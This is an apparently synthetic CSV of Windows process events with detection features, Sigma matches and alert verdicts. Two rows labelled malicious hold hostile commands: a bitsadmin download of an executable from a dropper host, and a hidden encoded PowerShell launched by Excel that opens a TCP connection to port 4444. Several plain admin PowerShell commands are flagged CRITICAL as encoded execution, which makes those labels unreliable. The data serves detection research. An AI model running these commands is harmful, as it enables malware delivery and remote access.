UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label,parent_process_name,child_process_name,is_known_lolbin,is_scripting_engine,command_line_length,command_line_entropy,has_suspicious_flag,contains_url,contains_ip_address,has_base64_pattern,argument_count,suspicious_argument_ratio,has_encoded_command,has_download_indicator,process_ancestry_depth,parent_is_office_app,parent_is_browser,parent_is_script_engine,chain_hash,hour_of_day,is_off_hours,is_weekend,minute_of_hour,parent_child_pair_rarity,command_length_zscore,entropy_zscore,is_system_user,user_encoded,integrity_encoded,sigma_match,sigma_rule_name,sigma_level,sigma_mitre_tags,ml_anomaly_score,chain_risk_score,chain_description,chain_matched_pattern,final_verdict,priority,confidence,explanation
2024-07-02T09:22:55.799Z,{56DE1A01-49E8-4AF4-8FAA-645E881872DA},4132,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,57740,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign,3,33,0,0,45,4.4302,0,0,0,0,4,0.0,0,0,1,0,0,0,2168783887,9,0,0,22,1.3349,0.3327809314790257,0.8944690581650444,1,15,3,False,None,none,,20.599570387280195,0,services.exe → svchost.exe: No known suspicious pattern,False,CLEAR,NONE,6.9,
2024-07-01T09:38:02.457Z,{5817FC10-3D72-4208-A635-C5912C7307FA},40176,C:\Windows\System32\cmd.exe,cmd.exe /c whoami,C:\Windows\explorer.exe,C:\Windows\explorer.exe,45041,CORP\klee,Medium,0,,,benign,0,4,1,1,17,3.6169,0,0,0,0,3,0.0,0,0,1,0,0,0,2764436884,9,0,0,38,0.9208,-0.7898535361610614,-0.3233390613833883,0,6,1,False,None,none,,35.32580870102798,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,11.8,
2024-07-02T02:32:40.116Z,{347B12EE-4E9B-4455-B03C-E13B5415DB1F},35773,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,34420,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign,3,33,0,0,48,4.7147,0,0,0,0,4,0.0,0,0,1,0,0,0,2168783887,2,1,0,32,1.3349,0.453063195869035,1.3204698082099582,1,7,3,False,None,none,,42.99117776841767,10,services.exe → svchost.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,14.3,
2024-07-03T14:51:42.884Z,{17F1261D-EAB7-478D-A293-8D8014A92A08},49172,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --no-first-run,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",54133,CORP\mjones,Medium,0,,,benign,0,13,0,0,25,3.7835,0,0,0,0,2,0.0,0,0,1,0,0,0,3306193959,14,0,0,51,1.7891,-0.46910083112103645,-0.0738778137296699,0,0,1,False,None,none,,2.2970371700478993,0,explorer.exe → chrome.exe: No known suspicious pattern,False,CLEAR,NONE,0.8,
2024-07-05T06:09:42.493Z,{8EA79FAC-1970-4077-B444-93CF73338CA7},15696,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k LocalService -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,56527,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign,3,33,0,0,50,4.6713,0,0,0,0,4,0.0,0,0,1,0,0,0,2168783887,6,0,0,9,1.3349,0.5332513721290413,1.2554841050396617,1,15,3,False,None,none,,26.983231043377153,0,services.exe → svchost.exe: No known suspicious pattern,False,CLEAR,NONE,9.0,
2024-07-04T19:32:14.417Z,{FA6F86AF-248C-471F-ADEE-25FABEE3DACC},8395,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job3133 /download /priority high http://dropper-srv7787.cc/sys604.exe C:\Users\Public\loader690.exe,C:\Windows\System32\cmd.exe,cmd.exe,50899,CORP\mjones,Medium,1,T1197,BITSAdmin Download,malicious,1,24,1,0,123,4.9458,1,1,0,0,8,0.125,0,1,2,0,0,1,3692683671,19,0,0,32,3.9031,3.460119805619268,1.6665111907596242,0,0,1,True,BITSAdmin File Download,high,attack.t1197,89.9198477978753,75,"cmd.exe → bitsadmin.exe: Command shell invoking bitsadmin [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,99.0,Sigma rule matched: BITSAdmin File Download | ML Score: 90 | Chain Risk: 75
2024-07-01T16:29:00.377Z,{56A14BA1-F580-4A7A-A694-997B90F1D729},14151,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name Spooler -Force""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,20109,CORP\itops,High,0,,,benign,1,3,1,1,73,4.3563,1,0,0,0,7,0.1429,0,0,2,0,0,1,4082297620,16,0,0,29,1.3846,1.4554153991191128,0.7838136788036412,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,56.42699800204795,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.6,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 56 | Chain Risk: 5
2024-07-03T03:43:23.557Z,{A8E49BCB-FC1B-4401-9317-365C02BE40AF},60093,C:\Program Files\Microsoft VS Code\Code.exe,Code.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",65083,CORP\helpdesk,Medium,0,,,benign,0,53,0,0,8,2.4056,0,0,0,0,1,0.0,0,0,1,0,0,0,1855645844,3,1,0,43,1.9488,-1.1507003293310893,-2.1370990210649516,0,14,1,False,None,none,,54.07737177935787,10,explorer.exe → code.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,18.0,
2024-07-04T07:55:57.163Z,{4B01FC93-D135-4EB8-AEF5-429AD9F5100E},54312,C:\Windows\System32\SearchIndexer.exe,C:\Windows\System32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,22458,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign,3,6,0,0,48,4.5608,0,0,0,0,2,0.0,0,0,1,0,0,0,2706394319,7,0,0,55,2.2041,0.453063195869035,1.0900251142489317,1,15,3,False,None,none,,29.233922631024612,0,services.exe → searchindexer.exe: No known suspicious pattern,False,CLEAR,NONE,9.7,
2024-07-05T15:48:25.551Z,{6BE77A2B-FCD9-4F9C-B0BF-66A65D9DAA55},6318,C:\Windows\System32\wbem\WMIC.exe,"wmic.exe os get caption,version,buildnumber",C:\Windows\System32\cmd.exe,cmd.exe,52596,CORP\sysadmin,High,0,,,gray_area,1,50,0,0,43,4.2664,0,0,0,0,4,0.0,0,0,2,0,0,1,579512134,15,0,0,48,3.9031,0.25259275521901947,0.6492004365223131,0,10,2,False,None,none,,60.58496420418376,0,cmd.exe → wmic.exe: No known suspicious pattern,False,CLEAR,NONE,20.2,
2024-07-02T08:44:48.316Z,{E9AFAE69-C1F4-4619-A561-AA0DB8735C05},61393,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,23270,NT AUTHORITY\SYSTEM,System,0,,,benign,3,25,0,0,31,4.236,0,0,0,0,1,0.0,0,0,1,0,0,0,1224424709,8,0,0,44,1.6726,-0.22853630234101782,0.6036804969744555,1,2,3,False,None,none,,15.646076101185642,0,services.exe → spoolsv.exe: No known suspicious pattern,False,CLEAR,NONE,5.2,
2024-07-05T03:09:06.168Z,{FCF0B48F-3FDE-4782-A22D-A563DC456174},30462,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,31543,NT AUTHORITY\SYSTEM,System,0,,,benign,2,49,0,0,41,4.269,0,0,0,0,1,0.0,0,0,1,0,0,0,1713248854,3,1,0,9,1.8617,0.17240457895901326,0.653093589246801,1,2,3,False,None,none,,33.32604740079897,10,svchost.exe → trustedinstaller.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,11.1,
2024-07-05T16:47:56.139Z,{7085CBF1-180D-4B56-8063-C44E10BDFDFE},57624,C:\Program Files\Slack\Slack.exe,Slack.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",5575,CORP\mjones,Medium,0,,,benign,0,20,0,0,9,2.9477,0,0,0,0,1,0.0,0,0,1,0,0,0,1108469835,16,0,0,47,1.699,-1.1106062412010862,-1.3253766780092462,0,0,1,False,None,none,,11.96397010007483,0,explorer.exe → slack.exe: No known suspicious pattern,False,CLEAR,NONE,4.0,
2024-07-01T10:23:44.144Z,{FE327C74-7540-456E-B397-BE5B7CE21940},34477,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,26458,CORP\sysadmin,High,0,,,benign,1,3,1,1,89,4.9011,1,0,0,0,9,0.1111,0,0,2,0,0,1,4082297620,10,0,0,23,1.3846,2.0969208091991622,1.599578911227083,0,10,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,50.467122154863574,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.0,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 50 | Chain Risk: 5
2024-07-03T10:53:03.707Z,{86515B9E-DB22-4760-822B-E0DF114D97CE},52403,C:\Windows\System32\mmc.exe,mmc.exe devmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,20342,CORP\sysadmin,High,0,,,benign,0,30,0,0,19,3.1761,0,0,0,0,2,0.0,0,0,1,0,0,0,2647570127,10,0,0,53,1.6021,-0.7096653599010552,-0.9833781848273189,0,10,2,False,None,none,,7.947765943724769,0,explorer.exe → mmc.exe: No known suspicious pattern,False,CLEAR,NONE,2.6,
2024-07-02T19:51:44.530Z,{F7F85B02-3A5D-4F0F-9788-9336B18482B5},31444,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",4291,CORP\agarwal,Medium,0,,,benign,0,27,0,0,11,3.2776,0,0,0,0,1,0.0,0,0,1,0,0,0,3378330899,19,0,0,51,1.6478,-1.03041806494108,-0.831395491929045,0,12,1,False,None,none,,13.50346551136119,0,explorer.exe → acrobat.exe: No known suspicious pattern,False,CLEAR,NONE,4.5,
2024-07-01T11:50:04.353Z,{024F43B2-56EC-4D22-AF8E-9F4960733C2C},16802,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,49034,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign,3,25,0,0,31,4.236,0,0,0,0,1,0.0,0,0,1,0,0,0,1224424709,11,0,0,50,1.6726,-0.22853630234101782,0.6036804969744555,1,15,3,False,None,none,,13.571622506642703,0,services.exe → spoolsv.exe: No known suspicious pattern,False,CLEAR,NONE,4.5,
2024-07-01T22:07:54.670Z,{50B2D75C-C38B-4306-AC48-C37DFFD6301A},43658,C:\Program Files\Windows Defender\MsMpEng.exe,"""C:\Program Files\Windows Defender\MsMpEng.exe""",C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,58521,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign,3,32,0,0,47,4.5221,0,0,0,0,3,0.0,0,0,1,0,0,0,4235360328,22,0,0,7,1.757,0.4129691077390319,1.0320770333113627,1,7,3,False,None,none,,25.93784461361012,0,services.exe → msmpeng.exe: No known suspicious pattern,False,CLEAR,NONE,8.6,
2024-07-05T12:56:54.432Z,{B6416733-660C-41C7-83AF-5050690B764F},53973,C:\Windows\System32\eventvwr.exe,eventvwr.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,1836,CORP\itops,High,0,,,benign,0,57,0,0,12,2.7516,0,0,0,0,1,0.0,0,0,1,0,0,0,2261623577,12,0,0,56,2.1249,-0.9903239768110769,-1.6190102354215763,0,5,2,False,None,none,,15.351658484759703,0,explorer.exe → eventvwr.exe: No known suspicious pattern,False,CLEAR,NONE,5.1,
2024-07-01T08:44:21.836Z,{7B42B107-1879-4F63-A93A-E070EA509253},8903,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-WmiObject Win32_OperatingSystem | Select Caption, Version""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,57383,CORP\agarwal,Medium,0,,,benign,1,3,1,1,98,4.7762,1,0,0,0,9,0.1111,0,0,2,0,0,1,4082297620,8,0,0,44,1.3846,2.4577676023691906,1.4125578438084203,0,12,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,52.64779747371858,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.3,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 53 | Chain Risk: 5
2024-07-04T14:28:04.648Z,{DE4C6845-3BD0-47BB-AAA7-6FE7993D73BC},53074,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-EventLog -LogName System -Newest 50""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,58679,CORP\agarwal,Medium,0,,,benign,1,3,1,1,76,4.5494,1,0,0,0,8,0.125,0,0,2,0,0,1,4082297620,14,0,0,28,1.3846,1.575697663509122,1.072955136918485,0,12,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,46.74091076765957,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.7,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 47 | Chain Risk: 5
2024-07-05T11:45:10.318Z,{DA228046-6CA1-42B1-988D-9AE6846AFA59},37099,C:\Program Files\Microsoft VS Code\Code.exe,Code.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",1896,CORP\agarwal,Medium,0,,,benign,0,53,0,0,8,2.4056,0,0,0,0,1,0.0,0,0,1,0,0,0,1855645844,11,0,0,45,1.9488,-1.1507003293310893,-2.1370990210649516,0,12,1,False,None,none,,20.911775295652667,0,explorer.exe → code.exe: No known suspicious pattern,False,CLEAR,NONE,7.0,
2024-07-04T20:48:53.431Z,{F2318017-43E5-4203-ADBC-C99908F66AD2},17532,C:\Windows\System32\notepad.exe,notepad.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",55716,CORP\analyst01,Medium,0,,,benign,0,47,0,0,11,3.0272,0,0,0,0,1,0.0,0,0,1,0,0,0,3438198496,20,0,0,48,2.1249,-1.03041806494108,-1.2063360466258695,0,13,1,False,None,none,,18.329060182644803,0,explorer.exe → notepad.exe: No known suspicious pattern,False,CLEAR,NONE,6.1,
2024-07-02T15:44:31.376Z,{4B362883-246E-4D18-9883-9DA16ED687A3},61575,C:\Windows\System32\SearchIndexer.exe,C:\Windows\System32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,53251,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign,3,6,0,0,48,4.5608,0,0,0,0,2,0.0,0,0,1,0,0,0,2706394319,15,0,0,44,2.2041,0.453063195869035,1.0900251142489317,1,7,3,False,None,none,,26.463688435688464,0,services.exe → searchindexer.exe: No known suspicious pattern,False,CLEAR,NONE,8.8,
2024-07-01T08:28:17.214Z,{BC4FFCBB-1021-4780-A5A9-2698CF2739D7},50885,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Installers\app_setup_6.2.40.msi /quiet,C:\Windows\explorer.exe,C:\Windows\explorer.exe,51694,CORP\sysadmin,High,0,,,benign,0,12,0,0,56,4.423,0,0,0,0,4,0.0,0,0,1,0,0,0,2082361945,8,0,0,28,1.4881,0.7738159009090598,0.883688019851078,0,10,2,False,None,none,,12.758637750563334,0,explorer.exe → msiexec.exe: No known suspicious pattern,False,CLEAR,NONE,4.3,
2024-07-02T11:43:36.451Z,{48F7E680-AA93-4256-A7EB-FF647F798C91},31256,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,51425,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign,3,25,0,0,31,4.236,0,0,0,0,1,0.0,0,0,1,0,0,0,1224424709,11,0,0,43,1.6726,-0.22853630234101782,0.6036804969744555,1,7,3,False,None,none,,13.571622506642703,0,services.exe → spoolsv.exe: No known suspicious pattern,False,CLEAR,NONE,4.5,
2024-07-04T16:41:22.315Z,{84ABD460-D447-4DE3-8CF9-DB2D4DF87F31},18141,C:\Windows\System32\cmd.exe,cmd.exe /c tasklist,C:\Windows\explorer.exe,C:\Windows\explorer.exe,24569,CORP\analyst02,Medium,0,,,benign,0,4,1,1,19,3.7216,0,0,0,0,3,0.0,0,0,1,0,0,0,2764436884,16,0,0,41,0.9208,-0.7096653599010552,-0.16656479590112944,0,11,1,False,None,none,,31.306370750819873,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,10.4,
2024-07-05T12:38:34.172Z,{16AC70E8-68A1-40E1-898F-689FF15503DF},22210,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Process | Sort-Object CPU -Descending | Select -First 10""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,65159,CORP\agarwal,Medium,0,,,benign,1,3,1,1,97,4.6495,1,0,0,0,12,0.0833,0,0,2,0,0,1,4082297620,12,0,0,38,1.3846,2.4176735142391874,1.2228415168112643,0,12,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,56.89505977895401,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.7,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 57 | Chain Risk: 5
2024-07-02T11:49:05.254Z,{BB3A8415-860F-4DEA-86B2-9E29263174D8},11334,C:\Windows\System32\conhost.exe,conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,33762,NT AUTHORITY\SYSTEM,System,0,,,benign,2,22,0,0,31,3.6797,0,0,0,0,3,0.0,0,0,1,0,0,0,26065344,11,0,0,49,1.8617,-0.22853630234101782,-0.2293044494226828,1,2,3,False,None,none,,9.158255395919774,0,svchost.exe → conhost.exe: No known suspicious pattern,False,CLEAR,NONE,3.1,
2024-07-02T12:49:18.721Z,{123F862C-A388-400F-AABA-7D711270F1B7},14584,C:\Windows\System32\cmd.exe,cmd.exe /c net use Z: \\fileserver\share,C:\Windows\explorer.exe,C:\Windows\explorer.exe,46235,CORP\pchen,Medium,0,,,benign,0,4,1,1,40,4.0251,0,0,0,0,6,0.0,0,0,1,0,0,0,2764436884,12,0,0,49,0.9208,0.13231049082901014,0.28788591636119604,0,1,1,False,None,none,,32.80214121947833,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,10.9,
2024-07-01T09:43:43.607Z,{51F9D505-D3AC-44CB-BBB8-2DA52AC468DF},32891,C:\Windows\System32\lsass.exe,C:\Windows\System32\lsass.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,35533,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign,3,46,0,0,29,4.1297,0,0,0,0,1,0.0,0,0,1,0,0,0,3252030755,9,0,0,43,1.6726,-0.30872447860102403,0.4445104452002044,1,7,3,False,None,none,,15.104129549349313,0,services.exe → lsass.exe: No known suspicious pattern,False,CLEAR,NONE,5.0,
2024-07-04T15:36:15.713Z,{A450D23A-1455-4FA3-8279-BB884B773752},15801,C:\Windows\System32\cmd.exe,cmd.exe /c ping google.com,C:\Windows\explorer.exe,C:\Windows\explorer.exe,20659,CORP\analyst01,Medium,0,,,benign,0,4,1,1,26,3.6322,0,0,0,0,4,0.0,0,0,1,0,0,0,2764436884,15,0,0,36,0.9208,-0.42900674299103336,-0.30042935496620965,0,13,1,False,None,none,,30.18247425836868,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,10.1,
2024-07-04T20:19:44.371Z,{8D03A306-606A-44BC-8865-383BEB5F5E04},10110,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAwAC4AMAAuADEAJwAsADQANAA0ADQAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /n document15.docm",54545,CORP\agarwal,Medium,1,T1204.002,Office Macro Execution,malicious,12,4,1,1,234,4.6156,1,0,0,1,8,0.375,1,0,2,1,0,0,1267013000,20,0,0,19,3.9031,7.910563588049614,1.1720807947496734,0,12,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,100.0,100,"excel.exe → cmd.exe: Excel spawning command shell (macro indicator) [Modifiers: +20 Office→Script chain, +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-03T17:46:36.011Z,{632DD9BD-98A6-4489-8FA0-F71EF70BEBA2},18141,C:\Windows\System32\cmd.exe,cmd.exe /c dir C:\Users,C:\Windows\explorer.exe,C:\Windows\explorer.exe,43839,CORP\analyst01,Medium,0,,,benign,0,4,1,1,23,3.7623,0,0,0,0,4,0.0,0,0,1,0,0,0,2764436884,17,0,0,46,0.9208,-0.5492890073810427,-0.10562198209857021,0,13,1,False,None,none,,30.49362309814766,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,10.2,
2024-07-02T13:08:47.799Z,{E50B5924-8BC8-4244-BC2B-6E88CB595224},58243,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ChildItem -Path C:\Logs -Recurse -Filter *.log""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,18613,CORP\itops,High,0,,,benign,1,3,1,1,87,4.6553,1,0,0,0,9,0.1111,0,0,2,0,0,1,4082297620,13,0,0,8,1.3846,2.0167326329391564,1.2315262421197382,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,45.343570334282234,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.5,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 45 | Chain Risk: 5
2024-07-01T10:05:31.865Z,{6FAA35B7-9F3C-4E20-A3B1-FD517F0B3368},29436,C:\Windows\System32\cmd.exe,cmd.exe /c ping 8.8.8.8,C:\Windows\explorer.exe,C:\Windows\explorer.exe,43264,CORP\admin,High,0,,,benign,0,4,1,1,23,3.4473,0,0,1,0,4,0.0,0,0,1,0,0,0,2764436884,10,0,0,5,0.9208,-0.5492890073810427,-0.577292408334592,0,3,2,False,None,none,,66.11101319537629,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,22.0,
2024-07-05T00:45:44.360Z,{C6A5CD71-62DD-4736-AD74-2AA3D79AABFC},63099,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s wuauserv,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,38201,NT AUTHORITY\SYSTEM,System,0,,,benign,2,33,0,0,57,4.4954,0,0,0,0,6,0.0,0,0,1,0,0,0,65539420,0,1,0,45,1.6726,0.813909989039063,0.9920973495637382,1,2,3,False,None,none,,41.83479496656715,10,svchost.exe → svchost.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,13.9,
2024-07-02T14:42:24.693Z,{FCCB86AC-2447-4CEE-ABFA-DE1C84EDE083},50029,C:\Windows\System32\calc.exe,calc.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",60166,CORP\pchen,Medium,0,,,benign,0,35,0,0,8,2.5,0,0,0,0,1,0.0,0,0,1,0,0,0,2236906458,14,0,0,42,1.699,-1.1507003293310893,-1.9957476298373948,0,1,1,False,None,none,,18.792073201824028,0,explorer.exe → calc.exe: No known suspicious pattern,False,CLEAR,NONE,6.3,
2024-07-03T11:20:20.668Z,{3F8FCE42-CF64-4D6C-B11D-49EDC9B275CA},20094,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --type=renderer --field-trial-handle=12345,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",47558,CORP\mjones,Low,0,,,benign,5,13,0,0,53,4.2344,0,0,0,0,3,0.0,0,0,2,0,1,0,3035334175,11,0,0,20,1.727,0.6535336365190505,0.6012847106824633,0,0,0,False,None,none,,39.46172576704669,0,chrome.exe → chrome.exe: No known suspicious pattern,False,CLEAR,NONE,13.2,
2024-07-01T15:20:26.155Z,{23F04F59-0C09-4DD4-81E9-CED57444EC51},28063,C:\Windows\System32\cmd.exe,cmd.exe /c nslookup corp.local,C:\Windows\explorer.exe,C:\Windows\explorer.exe,46252,CORP\klee,Medium,0,,,benign,0,4,1,1,30,3.8566,0,0,0,0,4,0.0,0,0,1,0,0,0,2764436884,15,0,0,20,0.9208,-0.26863039047102094,0.03557967248573653,0,6,1,False,None,none,,28.909200651971815,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,9.6,
2024-07-05T15:37:36.965Z,{3A8F43AA-5BF1-4426-BB22-AEE80BE253CF},44722,C:\Windows\regedit.exe,regedit.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,47538,CORP\sysadmin,High,0,,,benign,0,38,0,0,11,2.7322,0,0,0,0,1,0.0,0,0,1,0,0,0,3445876275,15,0,0,37,2.058,-1.03041806494108,-1.6480591442119847,0,10,2,False,None,none,,14.702592515624621,0,explorer.exe → regedit.exe: No known suspicious pattern,False,CLEAR,NONE,4.9,
2024-07-03T14:56:43.137Z,{6299306F-67CF-433E-8118-E406EBDD5BB2},23461,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Temp\update_9.9.67.msi /passive /norestart,C:\Windows\explorer.exe,C:\Windows\explorer.exe,60073,CORP\sysadmin,High,0,,,benign,0,12,0,0,60,4.3838,0,0,0,0,5,0.0,0,0,1,0,0,0,2082361945,14,0,0,56,1.4881,0.9341922534290723,0.8249912556972618,0,10,2,False,None,none,,13.473463096399843,0,explorer.exe → msiexec.exe: No known suspicious pattern,False,CLEAR,NONE,4.5,
2024-07-03T12:13:42.733Z,{EE00218B-78B7-4D33-BDF4-EF1EE79846FF},21590,C:\Windows\System32\calc.exe,calc.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",16642,CORP\netadmin,Medium,0,,,benign,0,35,0,0,8,2.5,0,0,0,0,1,0.0,0,0,1,0,0,0,2236906458,12,0,0,13,1.699,-1.1507003293310893,-1.9957476298373948,0,8,1,False,None,none,,18.531836336378394,0,explorer.exe → calc.exe: No known suspicious pattern,False,CLEAR,NONE,6.2,
